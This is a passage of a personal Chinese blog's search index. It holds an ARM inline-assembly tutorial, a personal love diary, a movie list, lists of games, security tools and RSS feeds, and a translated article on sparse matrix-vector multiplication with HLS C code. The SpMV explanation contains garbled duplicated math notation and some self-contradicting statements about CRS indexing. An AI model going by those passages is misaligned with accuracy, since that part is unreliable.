[%1]\"\"\\n\\t\"\n​ \"str %2, [%1, #4]\"\"\\n\\t\"\n​ : \"=\u0026r\" (rdv)\n​ : \"r\"(\u0026table), \"r\" (wdv)\n​ : \"memory\");\n在以张表中读取一个值然后在写到该表的另一个位置。\n其他\n内嵌汇编作为预处理宏\n要是经常使用使用部分汇编，最好的方法是将它以宏的形式定义在头文件中。使用该头文件在严格的ANSI模式下会出现警告。为了避免该类问题**，可以使用__asm__代替asm，__volatile__代替volatile**。这可以等同于别名。下面就是个例程：\n#define BYTESWAP(val) \\\nasm volatile ( \\\n​ \"eor r3, %1, %1, ror #16\\n\\t\" \\\n​ \"bic r3, r3, #0x00FF0000\\n\\t\" \\\n​ \"mov %0, %1, ror #8\\n\\t\" \\\n​ \"eor %0, %0, r3, lsr #8\" \\\n​ : \"=r\" (val) \\\n​ : \"0\"(val) \\\n​ : \"r3\", \"cc\" \\\n);\nC 桩函数\n宏定义包含的是相同的代码。这在大型routine中是不可以接受的。这种情况下最好定义个桩函数。\nunsigned long ByteSwap(unsigned longval)\n{\nasm volatile (\n​ \"eor r3, %1, %1, ror #16\\n\\t\"\n​ \"bic r3, r3, #0x00FF0000\\n\\t\"\n​ \"mov %0, %1, ror #8\\n\\t\"\n​ \"eor %0, %0, r3, lsr #8\"\n​ : \"=r\" (val)\n​ : \"0\"(val)\n​ : \"r3\"\n);\nreturn val;\n}\n替换C变量的符号名\n默认的情况下，GCC使用同函数或者变量相同的符号名。你可以使用asm声明，为汇编代码指定一个不同的符号名\nunsigned long value asm(\"clock\") = 3686400\n这个声明告诉编译器使用了符号名clock代替了具体的值。\n替换C函数的符号名\n为了改变函数名，你需要一个原型声明，因为编译器不接受在函数定义中出现asm关键字。\nextern long Calc(void) asm (\"CALCULATE\")\n调用函数calc()将会创建调用函数CALCULATE的汇编指令。\n强制使用特定的寄存器\n局部变量可能存储在一个寄存器中。你可以利用内嵌汇编为该变量指定一个特定的寄存器。\nvoid Count(void) {\nregister unsigned char counterasm(\"r3\");\n... some code...\nasm volatile(\"eor r3, r3,r3\");\n... more code...\n}\n汇编指令“eor r3, r3, r3”，会将r3清零。Waring：该例子在到多数情况下是有问题的，因为这将和优化器相冲突。因为GCC不会预留其它寄存器。要是优化器认为该变量在以后一段时间没有使用，那么该寄存器将会被再次使用。但是编译器并没有能力去检查是否和编译器预先定义的寄存器有冲突。如果你用这种方式指定了太多的寄存器，编译器将会在代码生成的时候耗尽寄存器的。\n临时使用寄存器\n如果你使用了寄存器，而你没有在input或output operand传递，那么你就必须向编译器指明这些。下面的例子中使用r3作为scratch 寄存器，通过在clobber list中写r3，来让编译器得知使用该寄存器。由于ands指令跟新了状态寄存器的标志位，使用cc在clobber list中指明。\nasm volatile(\n\"ands r3, %1, #3\" \"\\n\\t\"\n\"eor %0, %0, r3\" \"\\n\\t\"\n\"addne %0, #4\"\n: \"=r\" (len)\n: \"0\" (len)\n: \"cc\", \"r3\"\n);\n最好的方法是使用桩函数并且使用局部临时变量\n寄存器的用途\n比较好的方法是分析编译后的汇编列表，并且学习C 编译器生成的代码。下面的列表是编译器将ARM核寄存器的典型用途，知道这些将有助于理解代码。\n   Register Alt. Name Usage     r0 a1 First function argumentInteger function resultScratch register   r1 a2 Second function argumentScratch register   r2 a3 Third function argumentScratch register   r3 a4 Fourth function argumentScratch register   r4 v1 Register variable   r5 v2 Register variable   r6 v3 Register variable   r7 v4 Register variable   r8 v5 Register variable=   r9 v6 rfpRegister variableReal frame pointer   r10 sl Stack limit   r11 fp Argument pointer   r12 ip Temporary workspace   r13 sp Stack pointer   r14 lr Link register Workspace   r15 pc Program counter    ","description":"","tags":[],"title":"ARM","uri":"/posts/arm/"},{"categories":null,"content":"love  love is a charming mysterious and magic thing. I wanna. 陪伴是最长情的告白。 希望有一个人能陪我躺在草地上仰望星空 希望有一个人能陪我走在沙滩上看潮涨潮落 希望有一个人能陪我漫步于森林感受自然的气息  希望有一个人能陪我坐在邮轮上感受大海的辽阔 希望我能与你走遍天下，感尽天下冷暖。   I wanna. But she doesn't appear. The soulmate.    https://magic-king.net/love is waiting for u\n昨天刚看 TED关于爱情的演讲，都说爱情是猝不及防的，但是如果不去追求，怎么会发现转角遇到了爱呢？\n2019我尝试搭讪过，也尝试约会过，但是丘比特也好像打我miss了\n我不知道该怎样去PUA，但是我知道我的真诚\n我虽然是慢热，但是熟悉起来我可能聊个几天几夜也说不完，在想难道只有高冷地回一两句才能将对话进行下去吗？果然我还是不擅长这点。也正如前些天看房思琪的初恋乐园所讲的，父母所教的什么教育都有，唯独缺少了性教育，他们不是还没开始，是已经旷课了。所有的一切我都将自己去探索，从小到大。\n明年大概就是佛系丘比特了吧，也希望丘比特之箭能不再Miss。\n把你写下来，12.21今天的突发奇想，毕竟明年也要准备佛系了嘛，也要准备去考研了。\n想想上大学这两年，你真的是少数几个让我回第三眼的女孩。第一次在18年的冬至晚会上第一次见到你，就不由自主地想多看你几眼。头上绑着头带，仿佛如越前龙马般的cool。想着一定要搞到你的联系方式，没想到你上了台，知道了你的名字。原本还想着问你同桌的人，毕竟当时我还没现在这么大胆（虽然也还挺害羞的。不过，我竟然我先在之前因为天气原因鸽掉的环六校的小组里就加了我，也是意外惊喜。便开始了和你的聊天。 //TODO：透了，突然写不下去了，可能早上的灵感没了吧\n 假如我以后脱单了，你也喜欢玩游戏的话\n那么我现在这Mark一下好玩的小东东\n 只只大冒险：Steam 人类：一败涂地：Steam 分手出发：overcooked：Steam 继续说，不会炸 If you have a drunk friend 逃出生天 动物之森   （Stick Fight：The Game（坚持战斗：游戏））\n（马里奥赛车）\n（乱斗火柴人）\nhttps://www.bilibili.com/read/cv90137/\n 唉，为啥今天听着这无聊的毛概，彷佛想起了初二无聊着听着历史课，却侧头假装看着窗外的绿景，却看的是你的绝美侧颜\n唉，忽然好像谈个恋爱QAQ\n只想有个人能够无拘无束的交流\n然后再真诚地夸夸我，我大概会飘上天吧\nBy 2020.04.29\n 午睡的时候，总适合静心思考\n想念高中喜欢你的时候，就单纯的想跟你呆在一起，单纯的对一个人好，甜甜的\n仿佛只要呆在你身边就特别开心\n现在嘛，也不知道想不想谈恋爱了\n 《你曾是少年》\n有些时候 你怀念从前日子\n可天真离开时 你却没说一个字\n你只是挥一挥手 像扔掉废纸\n说是人生必经的事\n酒喝到七分 却又感觉怅然若失\n镜子里面 像看到人生终点\n或许再过上几年 你也有张虚伪的脸\n难道我们 是为了这样 才来到这世上\n这问题来不及想\n每一天一年 总是匆匆忙忙\n  害，在整理以前的东西时，才发现那是朦胧的感觉多么美好，默默地在记作业本上黑色的封面用黑色的笔写上你的名字（也不知哪看来，受了谁的影响）\n就连当时你写我的名字，我也精心收藏着\n这大概就是年少时的朦胧之美吧\n忽然，又好想和你在一起\n要是高中能像现在的我一样就好了\nBy 20200702\n 昨天跑步又看见了一个和你好像的人，保持匀速一起跑了好久，回想起高中，忽然又好想谈恋爱试试\nBy 20210113\n","description":"","tags":null,"title":"LOVE","uri":"/posts/love/"},{"categories":[],"content":"To the movie In the wanda   战狼2   空天猎   极致追击   英伦对决   看不见的客人   羞羞的铁拳   天才枪手   王牌特工2：黄金圈   银翼杀手2049   全球风暴   雷神3：诸神黄昏   精灵宝可梦： 波尔凯尼恩与机巧的马机雅娜   正义联盟   恐袭波士顿   推理笔记   烟花   寻梦环游记   巨额来电   帕丁顿熊2   鲨海   奇门遁甲   心理罪之城市之光   芳华   疯狂特警队   妖猫传   机器之血   妖铃铃   前任3： 再见前任   二代妖精之今生有幸   星球大战：最后的绝地武士   勇敢者游戏： 决战丛林   无问西东   谜巢   英雄本色2018   神秘巨星   移动迷宫3： 死亡解药   绝命时钟2：22   24小时：末路重生   忌日快乐   南极之恋   唐人街探案2   红海行动   捉妖记2   小萝莉的猴神大叔   黑豹   解忧杂货店   古墓丽影：起源之战   环太平洋：雷霆再起   头号玩家   通勤营救   起跑线   湮灭   脱单告急   幕后玩家   后来的我们   哆啦A梦：大雄的金银岛   复仇者联盟3：无限战争   超时空同居   游侠索罗：星球大战外传   深海越狱   侏罗纪世界2   超人总动员2   龙虾刑警   金蝉脱壳2   我不是药神   动物世界   邪不压正   摩天营救   西虹市首富   解码游戏   爱情公寓   一出好戏   快把我哥带走   欧洲攻略   蚁人2：黄蜂女现身   碟中谍6：全面瓦解   阿尔法：狼伴归途   反贪风暴3   影   无双   李茶的姑妈   我的间谍前男友   铁血战士   昨日青空   毒液：致命守护者   你好，之华   冰封侠：时空行者   飓风奇劫   名侦探柯南： 零的执行人   神奇动物： 格林德沃之罪   无敌破坏王2：大闹互联网   憨豆特工3   无名之辈   海王   龙猫   网络迷踪   天气预爆   来电狂响   蜘蛛侠：平行宇宙   地球最后的夜晚   大黄蜂   “大”人物   命运之夜——天之杯：恶兆之花   白蛇：缘起   密室逃生   死侍2：我爱我家   掠食城市   廉政风云4   流浪地球   疯狂外星人   飞驰人生   一吻定情   阿丽塔：战斗天使   驯龙高手3   惊奇队长   过春天   比悲伤更悲伤的故事   波西米亚狂想曲   乐高大电影2   海市蜃楼   反贪风暴4   风中有朵雨做的云   雷霆沙赞！   复仇者联盟4： 终局之战   祈祷落幕时   调音师   何以为家   大侦探皮卡丘   阿拉丁   哥斯拉2：怪兽之王   哆啦A梦：大雄的月球探险   X战警：黑凤凰   追龙II   绝杀慕尼黑   秦明·生死语者   黑衣人：全球追缉   玩具总动员4   千与千寻   蜘蛛侠：英雄远征   扫毒2：天地对决   爱宠大机密2   哪吒之魔童降世   烈火英雄   使徒行者2：碟影行动   沉默的证人   全职高手之巅峰荣耀   愤怒的小鸟2   铤而走险   罗小黑战记   检察方的罪人   宝莱坞机器人2.0：重生归来   罗小黑战记   名侦探柯南：绀青之拳   诛仙I   小Q   友情以上   中国机长   我和我的祖国   攀登者   犯罪现场   航海王：狂热行动   双子杀手   沉睡魔咒2   少年的你   天气之子   终结者：黑暗命运   受益人   霹雳娇娃   海上钢琴师   冰雪奇缘2   冰峰暴   两只老虎   勇敢者游戏2：再战巅峰   误杀   星球大战：天行者崛起   叶问4：完结篇   特警队   宠爱   亲爱的新年好   天使陷落   美丽人生   变身特工   为家而战   紫罗兰永恒花园外传：永远与自动手记人偶   灭绝   当幸福来敲门   喋血战士   星际穿越   1917   哈利波特与魔法石   八佰   盗梦空间   信条   夺冠   我和我的家乡   姜子牙   金刚川   除暴   拆弹专家2   送你一朵小红花   心灵奇旅   神奇女侠1984     ","description":"","tags":[],"title":"Movie","uri":"/posts/movie/"},{"categories":["Magic"],"content":"Magic Now You See ME ## **Magic Tree**   Game  uplay  Tom Clancy's Rainbow Six Siege Watch_Dogs Assassin Creed Tom Clancy's Ghost Recon Far Cry  origin  BattleField Mirror's Edge The Sims Apex Legends  steam   Wallpaper Engine\n  (Everything) xxx Simulator\n  Arma 3\n  Counter-Strike: Global Offensive\n  Chinese Parents\n  Detention\n  Dying Light\n  Getting Over It with Bennett Foddy\n  Grand Theft Auto V\n  Hacknet\n  Hitman\n  Hollow Knight\n  Human: Fall Flat\n  Left 4 Dead 1\u00262\n  LEGO®\n  Life is Strange\n  Monster Hunter: World\n  No Man's Sky\n  Overcooked\n  Payday 2\n  Plague Inc: Evolved\n  PlayerUnknown's BattleGrounds\n  Portal\n  Raft\n  Risk of Rain 2\n  Sid Meier's Civilization V\n  Sniper Elite 4\n  Squad\n  Star Wars™\n  Terraria\n  The Walking Dead\n  The Witcher\n  This War of Mine\n  Vampyr\n  War Thunder\n  Worms\n  Bilzzard  OverWatch  wegame  Siege League of Legends  Others  MineCraft cs1.6 CSOL KeepTalkingAndNobodyIsExolose    To be continue\n   Coding  Editor  Atom Notepad++ (vim) (subline) Typora(Markdown) (VScode)  language  java gcc python (shell) (dos) (arm) (x86)  ssh  PuTTY XShell 8uftp  Revision Control  git Mercurial(hg) (svn)  Terminal  zsh cygwin cmder MinGW (Power Shell) (Git Bash)  IDE  eclipse IDEA CodeBlock CLion PyCharm  Databases  Mysql Navicat  Vmware   ubuntu 18.04LTS \u002616.04LTS \u0026 seedUbuntu\n  CentOS7\n  Kali-Linux\n  win10\n  win7\n  winXP\n  IDA Pro\n  Wireshark\n  Burp_Suite_Pro\n  To be continue\n   Magic Application    gpg4win\n  bandzip\n  XMind\n  CCleaner\n  ShadowSocks(ssr)\n  Sync\n  clashR\n  YY\n  网易UU加速器\n  (Moss)\n  Internet Explore  Chrome FireFox  Adobe  PhoteShop AE Pr Flash Player  To be continue\n   Magic Rss   RssHub： https://docs.rsshub.app/  paper：https://paper.seebug.org/rss/ FreeBuf：https://www.freebuf.com/feed 52pojie.cn： https://www.52pojie.cn/forum.php?mod=rss v2ex周报：http://vdaily.iu.vc/old-weekly.xml DEFCON：https://www.defcon.org/defconrss.xml SecWiki News：https://www.sec-wiki.com/news/rss Exploit-DB.com：https://www.exploit-db.com/rss.xml NVD最新八天漏洞（CVE）： https://nvd.nist.gov/feeds/xml/cve/misc/nvd-rss.xml NVD近八天已分析漏洞： https://nvd.nist.gov/feeds/xml/cve/misc/nvd-rss-analyzed.xml 安全客混合主页资讯： https://api.anquanke.com/data/v1/rss 安全客最新漏洞列表： https://rsshub.app/aqk/vul Hacker News：https://news.ycombinator.com/rss Sec-news：http://wiki.ioin.in/atom 开源中国：https://rsshub.app/oschina/news 看雪：https://rsshub.app/pediy/topic/ 看雪pwn：https://rsshub.app/pediy/topic/pwn/latest 看雪编程技术：https://rsshub.app/pediy/topic/coding/latest 看雪二进制漏洞：https://rsshub.app/pediy/topic/vuln/latest 先知（阿里云）： https://xz.aliyun.com/feed  xxshangyx Instagram： https://rss.app/feeds/kM793aE1OC39tJXw.xml  ctftime：https://ctftime.org/event/list/upcoming/rss/  weibo：ringzero：https://rsshub.app/weibo/user/1859213130  离别歌： https://www.leavesongs.com/rss.php l3m0n： http://feed.cnblogs.com/blog/u/242399/rss/ LoRexxar： https://lorexxar.cn/atom.xml bendawnag： http://bendawang.site/rss.xml wonderkun： https://blog.wonderkun.cc/atom.xml EVILCOS余弦：https://evilcos.me/?feed=rss2 雨了个雨： https://rsshub.app/hexo/yilia/yulegeyu.com           Magic Skill  Magic Parkour Basketball Psychology   --\u003ewish  Piano Hack     Magic Bag Magic House  3D地画（视觉错误） 密室 小书房(with 呼吸灯、小阳台、舒适的沙发) 想要一面渐变色的风景 (有可能的话，想要个复式楼) 水滴倒流（惊天魔盗团2，利用光和水流的相对速度，形成视觉错误） RainbowSix 手办 纪念碑谷手办     Magic NAS 主板\n SATA3 \u003e=4 千兆网卡  内存条：8G\n稳定性电源：200-400W，好的1U电源\n电源：40w*25h = 1度电费\n1度= 1000w * h ≈ 0.45元\nMagic  心理学，如注意力转移 物理现象，如相对速度 视觉错误  ","description":"It is Magic.","tags":[],"title":"Magic","uri":"/posts/magic/"},{"categories":["algorithm"],"content":"稀疏矩阵向量乘  本文参考:\nFPGA矩阵计算并行算法与结构(知网)\n稀疏矩阵向量乘法xFPGA\n稀疏矩阵向量乘法x并行编程方法\n稀疏矩阵存储格式总结\n深度学习FPGA加速器设计\n 在矩阵中，若数值为0的元素数目远远多于非0元素的数目，并且非0元素分布没有规律时，则称该矩阵为稀疏矩阵；与之相反，若非0元素数目占大多数时，则称该矩阵为稠密矩阵。定义非零元素的总数比上矩阵所有元素的总数为矩阵的稠密度。 SpMV即 Sparse Matrix Vector Multiplication\n稀疏矩阵向量乘法的优化 稀疏矩阵向量乘法（SPMV）可在很多情况下代替稠密矩阵运算，可以大量节省内存占用，减少计算开销。矩阵向量乘法不同于矩阵和矩阵的乘法，这是完全访存密集型的计算，我们主要的优化方向是提升访存效率或减少访存开销。\n稀疏矩阵一般只存储非零元的信息，非零元的存储格式决定了访存的模式，这需要根据非零元的分布模式和要做的计算类型来设计。我们假设分布模式并非对角线分布，整体分布较均匀，局部可能会有聚集，计算类型是稀疏矩阵乘以稠密向量，结果为稠密向量。\n标准的稀疏矩阵存储格式主要有：COO（Coordinate Format）和CSR（Compressed Sparse Row）等。COO很简单，就是使用3个数组，分别存储全部非零元的行下标（row index）、列下标（column index）和值（value）；CSR稍复杂，对行下标进行了压缩，假设矩阵行数是m，则压缩后的数组长度为m+1，记作（row ptr），其中第i个元素（0-base）表示矩阵前i行的非零元个数。\n图1-1和图1-2展示了COO和CSR格式存储稀疏矩阵的一个例子。\n\n我们来考虑矩阵向量乘法计算y=Ax，其中A是稀疏矩阵，维度是m和n，非零元个数是k；x和y是稠密向量，维度分别是n和m，m×n \u003e\u003e k \u003e\u003e max(m, n)。做这个稀疏矩阵向量乘法就要遍历A的每一行，和x对应位置相乘，把结果累加到y的对应位置。这个过程对A的k个非零元全部访问了一遍，对x也访问了k个元素（重叠），对y访问了一遍，所以优化重点在于减少访问A的冗余，并提升访问x的效率。下面这几个优化标准稀疏矩阵存储格式的方法，可以提升访存效率，减少冗余。\n\n（1）对矩阵A做行列分块处理\n对x的访问每次总是从左到右进行稀疏的遍历，如果n很大（比如上百万甚至更多），则访问x的空间局部性较差。所以我们首先改进矩阵A的访问顺序，将矩阵A分解成多个方形的子矩阵。子矩阵的维度适应较高层CPU硬件cache的大小，这样在遍历每一个子矩阵时，对x的访问相对集中于一个较小的区间，这个区间内的x会被cache缓存，这样能够大大提高访问效率。分块方式如图1-3所示。\n\n（2）自适应分块存储结构\n由于稀疏矩阵的非零元分布不一定均匀，有的分块会非常稀疏，有的则会相对稠密。对于极稀疏的分块（非零元数量远小于行数），如果用和CSR相似的压缩行存储策略，则会浪费空间，所以用COO的方式反而更能节省存储空间，提高访问效率。\n对于哪些分块使用CSR，哪些使用COO方式，可以通过实验的方式确定一个非零元的数量和分块大小的比值。高于该值的用CSR方式存储，否则用COO方式存储。\n如图1-4所示，一共使用5个数组存储自适应分块信息的稀疏矩阵，灰色的部分是CSR的相关信息，白色的部分是COO的相关信息。col_idx和vals的意义不变；types存储分块类型，标识当前分块是CSR还是COO；如果当前分块是CSR，则row_info存储类似row_ptr的信息（第k个元素表示分块内第k行的非零元个数），否则存储COO的row_idx的信息；row_id存储每个分块在row_info上的起始地址。\n\n（3）减少下标存储的冗余\n矩阵分块后，分块内间址的下标并不需要4字节int型整数存储，比如分块维度在64K以内，可以用2字节的unsigned short来存储。这样，无论是CSR或COO的row_idx、row_ptr，还是col_idx，都可以减少50%的存储空间，并同时提升访存效率。\n（4）多线程和NUMA特性\n单处理器多核多线程并行计算稀疏矩阵向量乘的过程比较简单，只需把矩阵划分成线程数量的子矩阵。这里采用横切的方法，计算结果不用合并。\n但是对于多处理器非一致内存访问（NUMA），就需要对数据在内存中的分布做特殊处理，才能最大程度地利用全部的内存带宽。\n一个典型的Intel X86双路服务器的拓扑架构如图1-5所示。\nMemory #0是CPU #0的本地内存，Memory #1是CPU #1的本地内存，它们有各自独立的内存带宽。CPU #0访问Memory #1需要经过内部总线（在Intel的架构中叫QPI总线），这个总线的带宽一般小于内存带宽。另外如果要访问的数据只集中在一颗CPU的本地内存中，那么只能利用一个NUMA node的内存带宽，这就限制了系统的总体吞吐。\n所以需要把稀疏矩阵的存储均匀地分配到两颗处理器各自的本地内存中。对于一个双CPU，每颗CPU一共4核的系统，需要开8个线程，并把这8个线程分别绑定到8颗CPU核上，使线程的上下文不会在核间迁移。对于每个线程要处理的稀疏矩阵数据，也通过系统调用（在Linux中是mbind），绑定到所在CPU核的本地内存中。这样每个核处理的数据一定是从本地内存中获得的，不会经过QPI总线。这就最大程度地利用了系统内存的带宽。经过实测，这个优化方法可以提升70%左右的内存带宽。\n\n对于我们测试的一个维度大约1M、稀疏度0.0001的稀疏矩阵来说，所有优化加起来，相对Intel MKL库中CSR矩阵的SpMV API加速了2.5x左右。学术界还有很多针对稀疏矩阵存储格式的讨论和研究，其中有些还利用了SIMD向量指令，这里介绍的稀疏矩阵乘法方法，更多是为了讨论内存和cache优化的一些基本原理。稀疏矩阵根据稀疏度和非零元分布的不同，需要使用不同的存储策略，所以遇到实际的稀疏矩阵问题，需要根据实际情况开发不同的存储格式。\nFPGA上的稀疏矩阵向量乘稀疏矩阵向量乘法 稀疏矩阵向量乘（SpMV）把一个稀疏矩阵与一个向量相乘。稀疏矩阵是指矩阵中大部分元素为0的矩阵。这里的向量本身也可是稀疏的，但通常情况下是密集的。作为一种通用的运算，在科学应用、经济模型、数据挖掘、信息检索中广泛应用。例如，在利用迭代法求解稀疏线性方程组和特征值的问题。同时，也被应用于网页搜索排名和计算机视觉（图像重构等）。\n本章会引入几个与HLS相关的新概念，并进一步深入之前讨论过的优化。本章的目标之一是引入一种更复杂的数据结构。我们用压缩行存储（CRS）来保存稀疏矩阵。另一个目标是演示如何进行性能测试。我们编写了简单的激励用来检验设计是否正确。这在硬件设计中十分重要，Vivado®HLS 工具采用HLS C编写激励，并能轻松的对工具生成的RTL代码进行多方面的验证。这是基于HLS设计比基于RTL设计的巨大优势之一。章节中也会讲解如何采用Vivado®HLS工具进行C/RTL联合仿真。不同SpMV设计会带来性能上差异，因为执行时间和稀疏矩阵是密切相关的，所以我们必须通过输入数据来确定任务执行之间的间隔以及任务延迟。\n6.1 背景 图6.1显示了一个4x4的矩阵M表示的2种方式。其中图6.1-a采用通用的二维方式16个元素来表示矩阵，每个元素存储在自己对应的位置上。图6.1-b采用CRS的方式表示相同的矩阵。CRS 作为一种数据结构，由3个数组组成。值(values)数组保存矩阵中非零元素的值。列索引(columnIndex)数组和行指针（rowPtr）数组对非零元素的位置信息进行编码。列索引存储每一列的元素，行指针包含每一行第一个元素的值。CRS 结构避免存储矩阵中的0值，确实在数值数组中确实没有存储0。但是在这个例子中，虽然数值数组不保存0，但是列索引数组和行指针数组作为标记信息，表示了矩阵的形态。CRS 广泛用于大型的矩阵但是仅仅有少量的非零元素（少于10%或者更低），这样可以简化这类矩阵的存储以及相关的运算。\n图 6.1: M是一个4x4矩阵，用两种方式表示：同\"密集\"矩阵一样存在二维数组之中；作为稀疏矩阵，以行压缩存储的形式保存，行压缩存储是一种由3个数组组成的数据结构。\n但是，CRS对矩阵的稀疏性没有要求，可以适用于任何矩阵。作为一种针对矩阵的通用方法，但不见得是最高效的。CRS结构也不见得是表示稀疏矩阵最高效的方式，其他稀疏矩阵表示方法也在被使用。\n更准确的讲，CRS作为一种数据结构由3个数组构成：值(values)、列索引(colIndex)、行索引（rowPtr）。值数组和列索引表示稀疏矩阵M中的每一个非零元素，这些数组表示矩阵M采用行的方式，从左到右，从上到下。矩阵中的数据保存在值数组中，列索引数组保存数据在数组中水平方向的位置，如果 values[k] 表示 M_{ij}*M**i**j* 其中collndex[k]= j*c**o**l**l**n**d**e**x*[*k*]=*j*。数组**rowPtr**用n+1*n*+1的长度来表示n行矩阵。**rowPtr[k]** 表示在行k之前，矩阵中所有元素的数目，其中rowPtr[0]=0*r**o**w**P**t**r*[0]=0且最后一个元素**rowPtr[k]** 总是表示当前矩阵k行之前所有非零元素的个数M_{ij}*M**i**j* ,其中rowPtr[i] \\leq k \\leq rowPtr[i+1]*r**o**w**P**t**r*[*i*]≤*k*≤*r**o**w**P**t**r*[*i*+1]。如果行k包含任何非0元素，那么**rowPtr[k]** 将包含当前行的第一个元素。注意，如果当前行没有非0元素，那么 **rowPtr** 数组中的值将会重复出现。\n从图6.1 a）中，我们可以行优先的方式遍历矩阵，从而确定值（values）数组在CRS中的形式。只要发现一个非0元素，它的值会被保存在下一个索引 ii 中，同时，它的列号columnIndex[i] 会被保存在列数组中。另外，在我们访问一个新行的时候，我们保存下一个值的索引 ii 在rowPtr数组中。所以，rowPtr 数组的第一个元素总是0。从图 6.1 b)中，我们可以把矩阵转换为二位数组表示的方式。第一步是根据rowPtr数组，确定每一行中非0 元素的个数。对行 ii 而言，该行中元素的数目为rowPtr[i]-rowPtr[i+1]rowPt**r[i]−rowPt**r[i+1]的差值。所以当前行的值可以从values数组values[rowPtr[i]] 开始，通过递归得到。在我们的示例矩阵中，因为前 rowPtr 数组前2个元素是0和2，所以我们知道第一行有2个非0元素，即value[0] 和value[1] 。第一个非0元素在values数组中,value[0] 是3。该值所对应的列号为1，因为columnIndex[0]=0columnIndex[0]=0。以此类推，矩阵中第二行元素的个数为k\\in[2,4)k∈[2,4),第三行的元素个数为k \\in [4,7)k∈[4,7)。最后，共有9个非0元素在矩阵中，所以rowPtr最后一个值是9。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  #include \"spmv.h\" void spmv(int rowPtr[NUM_ROWS+1], int columnIndex[NNZ], DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE]){ L1: for (int i = 0; i \u003c NUM_ROWS; i++) { DTYPE y0 = 0; L2: for (int k = rowPtr[i]; k \u003c rowPtr[i+1]; k++) { #pragma HLS unroll factor=8  #pragma HLS pipeline  y0 += values[k] * x[columnIndex[k]]; } y[i] = y0; } }   图6.2: 主体代码演示了系数矩阵向量乘（SpMV）y=M.x的计算。采用CRS的方式，通过rowPt*、columnIndex 和 value 保存矩阵M。第一个for循环通过迭代访问每一行，第二个for循环访问每一列，实现矩阵M中非0元素和向量中对应的元素相乘并保存值在向量y中。\n给定一个二维数组表示一个矩阵，通过C代码实现矩阵CRS格式。编写对应的C代码实现将矩阵从CRS格式转化为二维数组的形式。\n结果表明，通过采用CRS的方式，我们能高效的实现稀疏矩阵乘法，不需要将矩阵转化为二维形式。实际上， 对于大型的矩阵仅仅只有一小部分非0元素，稀疏矩阵向量乘法会比第四章中讨论的密集矩阵向量乘高效很多。因为我们直接找到非0元素，并执行非0元素对应的运算。\n6.2 基本实现 图6.2 提供了基本代码对系数矩阵乘法的实现。函数spmv函数有5个参数，分别是rowPtr、columnIndex ，以及 values 对应矩阵 M 的 CRS 格式中包含的3个参数，这和图6.1中描述的数据结构等价。参数 yy 用于保存输出的结果，参数x表示输入的被乘向量xx。变量NUM_ROWS表示矩阵M中行号。变量NNZ表示矩阵中非0元素的个数。最后，变量SIZE表示数组x和数组y中元素的个数。\n外层for循环标签为L1，对矩阵的行进行遍历。将矩阵当前的行与向量x相乘，得到输出的结果yy。内层循环标签为L2，实现对矩阵M中每列元素的遍历。L2循环迭代计算rowPtr[i+1]-rowPtr[i]rowPt**r[i+1]−rowPt**r[i]计算每一行非0元素的个数。每次循环计算，能从value数组中读取矩阵M的非0元素然后对应的从x数组中取得被乘向量x的值，对应相乘。cloumnIndex[k] 中的值保存了对应的列号k。\n1 2 3 4 5 6 7 8 9 10 11  #ifndef __SPMV_H__ #define __SPMV_H__  const static int SIZE = 4; // SIZE of square matrix const static int NNZ = 9; //Number of non-zero elements const static int NUM_ROWS = 4;// SIZE; typedef float DTYPE; void spmv(int rowPtr[NUM_ROWS+1], int columnIndex[NNZ], DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE]); #endif // __MATRIXMUL_H__ not defined   图6.3： spmv函数和激励的头文件\n6.3 测试平台 图6.4 展示了一个针对spmv函数测试平台。测试平台通过定义matrixvector函数，直接实现矩阵向量乘法，它不考虑矩阵是否为稀疏矩阵以及矩阵是否采用CRS方式表示。我们比较matrixvector函数输出和spmv函数的输出。\n在通常的测试平台中，需要实现的函数都会有个“黄金\"参考，作为用户期望综合的结果。测试平台会比较黄金用例的输出和通过Vivado®HLS综合的代码执行结果。最好的实践方式是，测试平台既可以用于黄金用例，也可用于被综合的代码。这样就保证了两者实现的正确性。\n测试平台在主函数main中执行。这里我们通过设置fail变量初始化为0，当spmv函数的输出成结果与matrixvector函数输出结果不相同是时，变量置1。定义与矩阵M相关的变量、被乘向量xx 和输出结果yy。对于矩阵M，即有普通模式，也有CSR模式（保存为values、columnIndex、rowPtr）。矩阵M 的value如图6.1中所示，输出向量yy有两种，其中y_sw数组保存matrixvector函数输出的结果，y数组保存spmv函数输出的结果。\n在定义好所有的输入变量和输出变量之后，分别调用spmv函数和matrixvector函数并输入合适的数据。 接下来的for循环用于比较y_sw和y中的每一个对应的结果。如果其中一个不相同，则将fail 标志置1。最后，程序会打印测试的结果并返回fail变量。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  #include \"spmv.h\"#include \u003cstdio.h\u003e void matrixvector(DTYPE A[SIZE][SIZE], DTYPE *y, DTYPE *x) { for (int i = 0; i \u003c SIZE; i++) { DTYPE y0 = 0; for (int j = 0; j \u003c SIZE; j++) y0 += A[i][j] * x[j]; y[i] = y0; } } int main(){ int fail = 0; DTYPE M[SIZE][SIZE] = {{3,4,0,0},{0,5,9,0},{2,0,3,1},{0,4,0,6}}; DTYPE x[SIZE] = {1,2,3,4}; DTYPE y_sw[SIZE]; DTYPE values[] = {3,4,5,9,2,3,1,4,6}; int columnIndex[] = {0,1,1,2,0,2,3,1,3}; int rowPtr[] = {0,2,4,7,9}; DTYPE y[SIZE]; spmv(rowPtr, columnIndex, values, y, x); matrixvector(M, y_sw, x); for(int i = 0; i \u003c SIZE; i++) if(y_sw[i] != y[i]) fail = 1; if(fail == 1) printf(\"FAILED\\n\"); else printf(\"PASS\\n\"); return fail; }   图6.4 ： 